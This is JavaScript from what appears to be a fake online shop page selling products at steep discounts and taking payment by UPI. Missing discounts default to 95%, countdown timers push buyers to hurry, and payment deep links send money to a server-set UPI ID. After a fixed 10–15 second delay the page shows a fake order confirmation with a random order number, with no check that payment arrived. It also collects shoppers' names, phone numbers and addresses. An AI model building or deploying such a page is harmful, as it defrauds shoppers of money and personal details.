  var discount = Math.round(((parseInt(product.mrp) - parseInt(product.selling_price)) / parseInt(product.mrp)) * 100);
  if (isNaN(discount) || discount < 0) discount = 95;

  document.getElementById('detailName').textContent = product.name;
  document.getElementById('detailSP').textContent = '₹' + parseInt(product.selling_price).toLocaleString('en-IN');
  document.getElementById('detailMRP').textContent = '₹' + parseInt(product.mrp).toLocaleString('en-IN');
  document.getElementById('detailOff').textContent = discount + '% off';
  document.getElementById('detailColorImg').src = product.img1;
  document.getElementById('detailColorText').textContent = product.color;

  navigate('product');
}

function goDetailSlide(idx) {
  var track = document.getElementById('detailTrack');
  if (!track._total) return;
  track._current = idx;
  track.style.transform = 'translateX(-' + (idx * 100) + '%)';
  var dots = document.querySelectorAll('#detailDots .dot');
  for (var i = 0; i < dots.length; i++) {
    dots[i].classList.toggle('active', i === idx);
  }
}

// ─────────────────────────────────────────
//  ADDRESS
// ─────────────────────────────────────────
function goToAddress() {
  navigate('address');
}

function submitAddress(event) {
  event.preventDefault();
  var form = document.getElementById('addressForm');
  var data = new FormData(form);
  currentAddress = {
    name: data.get('name'),
    mobile: data.get('mobile'),
    pincode: data.get('pincode'),
    city: data.get('city'),
    state: data.get('state'),
    house: data.get('house'),
    street: data.get('street')
  };
  buildSummaryPage();
  navigate('summary');
}

// ─────────────────────────────────────────
//  SUMMARY
// ─────────────────────────────────────────
function buildSummaryPage() {
  if (!currentProduct) return;

  document.getElementById('sumImg').src = currentProduct.img1;
  document.getElementById('sumName').textContent = currentProduct.name;

  var addr = currentAddress;
  document.getElementById('sumAddress').innerHTML =
    addr.name + ', ' + addr.mobile + '<br>' +
    addr.house + ', ' + addr.street + ',<br>' +
    addr.city + ' - ' + addr.pincode + ', ' + addr.state;

  var mrp = parseInt(currentProduct.mrp) || 0;
  var sp = parseInt(currentProduct.selling_price) || 0;
  var discount = mrp - sp;

  document.getElementById('sumMRP').textContent = '₹' + mrp.toLocaleString('en-IN') + '.00';
  document.getElementById('sumDiscount').textContent = '- ₹' + discount.toLocaleString('en-IN') + '.00';
  document.getElementById('sumTotal').textContent = '₹' + sp.toLocaleString('en-IN') + '.00';
  document.getElementById('payAmount').textContent = sp.toLocaleString('en-IN');

  // Start summary timer
  if (summaryTimerInterval) clearInterval(summaryTimerInterval);
  summaryTimerSec = 360;
  summaryTimerInterval = setInterval(function() {
    summaryTimerSec--;
    if (summaryTimerSec <= 0) {
      clearInterval(summaryTimerInterval);
      document.getElementById('summaryTimer').textContent = '0:00';
    } else {
      var m = Math.floor(summaryTimerSec / 60);
      var s = summaryTimerSec % 60;
      document.getElementById('summaryTimer').textContent = m + ':' + (s < 10 ? '0' : '') + s;
    }
  }, 1000);
}

// ─────────────────────────────────────────
//  PAYMENT
// ─────────────────────────────────────────
function selectPayment(method) {
  selectedPayment = method;
  document.querySelectorAll('.pay-option').forEach(function(el) {
    el.classList.remove('selected');
  });
  var radios = document.querySelectorAll('input[name="payMethod"]');
  for (var i = 0; i < radios.length; i++) {
    if (radios[i].value === method) {
      radios[i].checked = true;
      radios[i].closest('.pay-option').classList.add('selected');
      break;
    }
  }
  document.getElementById('qrWrap').style.display = (method === 'QR') ? 'block' : 'none';
}

function processPayment() {
  if (!selectedPayment) {
    alert('Please select a payment method.');
    return;
  }
  if (!currentProduct) return;

  var upiId = '<?php echo addslashes($upiId); ?>';
  var amount = currentProduct.selling_price;
  var name = '<?php echo addslashes($merchantName); ?>';
  var upiUrl = '';

  if (selectedPayment === 'QR') {
    // QR is scanned manually, no deep link needed
    document.getElementById('qrWrap').style.display = 'block';
    setTimeout(function() { showSuccess(); }, 15000);
    return;
  } else if (selectedPayment === 'G-pay') {
    upiUrl = 'tez://upi/pay?pa=' + upiId + '&pn=' + encodeURIComponent(name) + '&tn=Order&am=' + amount + '&cu=INR';
  } else if (selectedPayment === 'PhonePe') {
    upiUrl = 'phonepe://pay?pa=' + upiId + '&pn=' + encodeURIComponent(name) + '&tn=Order&am=' + amount + '&cu=INR';
  } else if (selectedPayment === 'Paytm') {
    upiUrl = 'paytmmp://pay?pa=' + upiId + '&pn=' + encodeURIComponent(name) + '&tn=Order&am=' + amount + '&cu=INR';
  } else {
    upiUrl = 'upi://pay?pa=' + upiId + '&pn=' + encodeURIComponent(name) + '&tn=Order&am=' + amount + '&cu=INR';
  }

  window.location.href = upiUrl;

  // Show success after delay
  setTimeout(function() {
    showSuccess();
  }, 10000);
}

function showSuccess() {
  var orderId = Math.floor(Math.random() * 8529059999 + 1015015);
  document.getElementById('orderIdDisplay').textContent = orderId;
  navigate('success');
  // Reset form
  document.getElementById('addressForm').reset();
  currentAddress = {};
  selectedPayment = '';
  document.querySelectorAll('.pay-option').forEach(function(el) {
    el.classList.remove('selected');
  });
  document.querySelectorAll('input[name="payMethod"]').forEach(function(r) {
    r.checked = false;
  });
}

// ─────────────────────────────────────────
//  SEARCH
// ─────────────────────────────────────────
function handleSearch(query) {
  query = query.trim().toLowerCase();
  var header = document.getElementById('searchHeader');
  if (query === '') {
    header.style.display = 'none';
    renderProductGrid(PRODUCTS);
    return;
  }
  header.style.display = 'block';
  document.getElementById('searchQuery').textContent = query;
  var results = PRODUCTS.filter(function(p) {
    return p.name.toLowerCase().indexOf(query) !== -1 ||
           p.color.toLowerCase().indexOf(query) !== -1 ||
           p.storage.toLowerCase().indexOf(query) !== -1;
  });
  renderProductGrid(results);
}

function clearSearch() {
  document.getElementById('homeSearch').value = '';
  document.getElementById('searchHeader').style.display = 'none';
  renderProductGrid(PRODUCTS);
}

function filterCategory(el) {
  // Highlight selected category
  document.querySelectorAll('#categoryStrip img').forEach(function(img) {
    img.style.outline = '';
  });
  el.style.outline = '2px solid #2875f0';
  // Scroll product grid into view
  document.getElementById('productGrid').scrollIntoView({ behavior: 'smooth' });
}

// ─────────────────────────────────────────
//  BANNER CAROUSEL
// ─────────────────────────────────────────
function moveBanner(dir) {
  bannerIndex = (bannerIndex + dir + bannerTotal) % bannerTotal;
  document.getElementById('bannerTrack').style.transform = 'translateX(-' + (bannerIndex * 100) + '%)';
  updateBannerDots();
}

function updateBannerDots() {
  var dots = document.querySelectorAll('#bannerDots .dot');
  for (var i = 0; i < dots.length; i++) {
    dots[i].classList.toggle('active', i === bannerIndex);
  }
}

function initBanner() {
  var dotsEl = document.getElementById('bannerDots');
  var html = '';
  for (var i = 0; i < bannerTotal; i++) {
    html += '<div class="dot' + (i === 0 ? ' active' : '') + '" onclick="jumpBanner(' + i + ')"></div>';
  }
  dotsEl.innerHTML = html;

  bannerTimer = setInterval(function() {
    moveBanner(1);
  }, 2300);
}

function jumpBanner(idx) {
  bannerIndex = idx;
  document.getElementById('bannerTrack').style.transform = 'translateX(-' + (bannerIndex * 100) + '%)';
  updateBannerDots();
}

// ─────────────────────────────────────────
//  HOME SALE TIMER
// ─────────────────────────────────────────
function startHomeTimer() {
  homeTimerInterval = setInterval(function() {
    homeTimerSec--;
    if (homeTimerSec <= 0) {
      clearInterval(homeTimerInterval);
      document.getElementById('homeTimer').textContent = '0:00';
      return;
    }
    var m = Math.floor(homeTimerSec / 60);
    var s = homeTimerSec % 60;
    document.getElementById('homeTimer').textContent = m + ':' + (s < 10 ? '0' : '') + s;
  }, 1000);
}

// ─────────────────────────────────────────
//  INIT
// ─────────────────────────────────────────
window.onload = function() {
  renderProductGrid(PRODUCTS);
  initBanner();
  startHomeTimer();
};
</script>
</body>
</html>